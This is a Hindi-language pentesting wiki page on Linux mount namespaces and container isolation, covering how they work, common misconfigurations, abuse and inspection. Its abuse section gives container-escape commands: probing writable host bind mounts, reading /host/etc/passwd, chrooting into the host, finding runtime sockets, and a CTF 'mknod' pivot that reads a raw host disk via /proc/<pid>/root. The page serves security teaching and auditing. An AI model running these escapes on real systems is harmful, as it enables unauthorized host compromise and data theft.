# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## अवलोकन

mount namespace उस **mount table** को नियंत्रित करता है जिसे कोई प्रक्रिया देखती है। यह container isolation सुविधाओं में से सबसे महत्वपूर्ण है क्योंकि root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure, और कई runtime-विशिष्ट helper mounts सभी उस mount table के माध्यम से व्यक्त होते हैं। दो प्रक्रियाएँ दोनों `/`, `/proc`, `/sys`, या `/tmp` को एक्सेस कर सकती हैं, लेकिन उन पाथ्स का अर्थ (what those paths resolve to) इस बात पर निर्भर करता है कि वे किस mount namespace में हैं।

container-security के दृष्टिकोण से, mount namespace अक्सर यह फ़र्क होता है कि "यह एक अच्छी तरह से तैयार application filesystem है" या "यह प्रक्रिया host filesystem को सीधे देख या प्रभावित कर सकती है"। इसलिए bind mounts, `hostPath` volumes, privileged mount operations, और writable `/proc` या `/sys` exposures सभी इसी namespace के इर्द-गिर्द घूमते हैं।

## Operation

जब कोई runtime एक container लॉन्च करता है, तो आम तौर पर यह एक नया mount namespace बनाता है, container के लिए एक root filesystem तैयार करता है, आवश्यकतानुसार procfs और अन्य helper filesystems को mount करता है, और फिर वैकल्पिक रूप से bind mounts, tmpfs mounts, secrets, config maps, या host paths जोड़ता है। एक बार वह प्रक्रिया namespace के अंदर चलने लगे, तो जो mounts वह देखता है वे बड़ी हद तक host के डिफ़ॉल्ट view से अलग हो जाते हैं। host अभी भी वास्तविक underlying filesystem देख सकता है, लेकिन container उस संस्करण को देखता है जो runtime ने उसके लिए assembled किया होता है।

यह शक्तिशाली है क्योंकि इससे container को लगता है कि उसके पास अपना खुद का root filesystem है, भले ही host अभी भी सब कुछ प्रबंधित कर रहा हो। यह खतरनाक भी है क्योंकि अगर runtime गलत mount expose कर दे, तो उस प्रक्रिया को अचानक host resources की visibility मिल सकती है जिन्हें बाकी security मॉडल ने सुरक्षित करने के लिए डिज़ाइन नहीं किया गया था।

## Lab

आप निम्न के साथ एक निजी mount namespace बना सकते हैं:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
यदि आप उस namespace के बाहर दूसरा shell खोलकर mount table की जाँच करेंगे, तो आप देखेंगे कि tmpfs mount केवल isolated mount namespace के अंदर मौजूद है। यह एक उपयोगी अभ्यास है क्योंकि यह दिखाता है कि mount isolation कोई सैद्धांतिक बात नहीं है; kernel वाकई process को एक अलग mount table प्रस्तुत कर रहा है।
यदि आप उस namespace के बाहर दूसरा shell खोलकर mount table की जाँच करेंगे, तो tmpfs mount केवल isolated mount namespace के अंदर मौजूद होगा।

Inside containers, एक त्वरित तुलना है:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
दूसरा उदाहरण दिखाता है कि एक runtime configuration के लिए फाइलसिस्टम की सीमा में इतना बड़ा छेद करना कितना आसान हो सकता है।

## रनटाइम उपयोग

Docker, Podman, containerd-based stacks, और CRI-O सभी सामान्य containers के लिए एक private mount namespace पर निर्भर करते हैं। Kubernetes उसी मेकैनिज़्म के ऊपर volumes, projected secrets, config maps, और `hostPath` mounts के लिए बनाया गया है। Incus/LXC environments भी mount namespaces पर भारी निर्भर करते हैं, खासकर क्योंकि system containers अक्सर application containers की तुलना में अधिक समृद्ध और अधिक मशीन-जैसी फाइलसिस्टम एक्सपोज़ करते हैं।

इसका मतलब यह है कि जब आप किसी container filesystem समस्या की समीक्षा करते हैं, तो आप आमतौर पर किसी अलग-थलग Docker quirk को नहीं देख रहे होते। आप उस workload को लॉन्च करने वाले किसी भी प्लेटफ़ॉर्म के माध्यम से व्यक्त mount-namespace और runtime-configuration समस्या को देख रहे होते हैं।

## गलत कॉन्फ़िगरेशन

सबसे स्पष्ट और खतरनाक गलती host root filesystem या किसी अन्य संवेदनशील host path को bind mount के माध्यम से एक्सपोज़ करना है, उदाहरण के लिए `-v /:/host` या Kubernetes में writable `hostPath`। उस बिंदु पर, सवाल अब यह नहीं रहता "क्या container किसी तरह से बाहर निकल सकता है?" बल्कि होता है "कितना उपयोगी host कंटेंट पहले से ही सीधे दिखाई दे रहा है और writable है?" एक writable host bind mount अक्सर बाकी exploit को फ़ाइल रखने, chrooting, config बदलने, या runtime socket खोज तक आसान बना देता है।

एक और सामान्य समस्या host `/proc` या `/sys` को इस तरह एक्सपोज़ करना है कि वे safer container view को बायपास कर दें। ये filesystems सामान्य डेटा mounts नहीं हैं; ये kernel और process state के interfaces हैं। अगर workload सीधे host वर्शन तक पहुँचता है, तो container hardening के पीछे कई मान्यताएँ साफ़ तौर पर लागू होना बंद कर देती हैं।

Read-only protections भी मायने रखती हैं। एक read-only root filesystem जादुई रूप से container को सुरक्षित नहीं बनाता, लेकिन यह attacker के staging space का एक बड़ा हिस्सा हटा देता है और persistence, helper-binary placement, और config tampering को अधिक कठिन बना देता है। इसके विपरीत, एक writable root या writable host bind mount हमलावर को अगला कदम तैयार करने की जगह देता है।

## दुरुपयोग

जब mount namespace का दुरुपयोग किया जाता है, तो हमलावर आमतौर पर चार में से एक काम करते हैं। वे **host डेटा पढ़ते हैं** जो container के बाहर रहना चाहिए था। वे writable bind mounts के माध्यम से **host कॉन्फ़िगरेशन में बदलाव करते हैं**। वे अगर capabilities और seccomp अनुमति दें तो **अतिरिक्त resources को mount या remount करते हैं**। या वे ऐसे **शक्तिशाली sockets और runtime state directories तक पहुँचते हैं** जो उन्हें container platform से और अधिक access मांगने देते हैं।

अगर container पहले से host filesystem देख सकता है, तो बाकी security model तुरंत बदल जाता है।

जब आप किसी host bind mount का संदेह करते हैं, पहले यह पुष्टि करें कि क्या उपलब्ध है और क्या वह writable है:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
यदि host root filesystem read-write के रूप में माउंट है, तो direct host access अक्सर उतना ही सरल होता है:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
यदि लक्ष्य privileged runtime access है न कि सीधे chrooting, तो sockets और runtime state सूचीबद्ध करें:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
यदि `CAP_SYS_ADMIN` मौजूद है, तो यह भी जाँचें कि container के अंदर से नए mounts बनाए जा सकते हैं या नहीं:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### पूर्ण उदाहरण: Two-Shell `mknod` Pivot

एक अधिक विशेषीकृत दुरुपयोग मार्ग तब उत्पन्न होता है जब कंटेनर का रूट उपयोगकर्ता block devices बना सकता है, host और container किसी उपयोगी तरीके से user identity साझा करते हैं, और attacker के पास पहले से ही host पर एक low-privilege foothold मौजूद हो। उस स्थिति में, कंटेनर एक device node जैसे `/dev/sda` बना सकता है, और low-privilege host user बाद में matching container process के लिए `/proc/<pid>/root/` के माध्यम से उसे पढ़ सकता है।

कंटेनर के अंदर:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
host से, मेल खाने वाले low-privilege user के रूप में, container shell PID का पता लगाने के बाद:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
महत्वपूर्ण सबक सटीक CTF string search नहीं है। यह है कि mount-namespace के माध्यम से `/proc/<pid>/root/` का एक्सपोजर host user को container-created device nodes को पुनः उपयोग करने की अनुमति दे सकता है, भले ही cgroup device policy ने container के अंदर सीधे उपयोग को रोका हो।

## जाँच

ये commands इसलिए दिए गए हैं ताकि वे आपको उस filesystem view को दिखाएँ जिसमें current process वास्तव में रह रहा है। लक्ष्य host-derived mounts, writable sensitive paths, और किसी भी ऐसी चीज़ को पहचानना है जो सामान्य application container root filesystem से व्यापक दिखे।
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
यहाँ ध्यान देने योग्य:

- Host से bind mounts, खासकर `/`, `/proc`, `/sys`, runtime state directories, या socket स्थान, तुरंत ध्यान खींचने चाहिए।
- अनपेक्षित read-write mounts आमतौर पर read-only helper mounts की बड़ी संख्या की तुलना में अधिक महत्वपूर्ण होते हैं।
- `mountinfo` अक्सर यह देखने के लिए सबसे अच्छा स्थान होता है कि कोई path वास्तव में host-derived है या overlay-backed।

ये जांचें यह स्थापित करती हैं कि **कौन से resources इस namespace में दिखाई देते हैं**, **कौन से host-derived हैं**, और **इनमें से कौन writable या security-sensitive हैं**।
{{#include ../../../../../banners/hacktricks-training.md}}
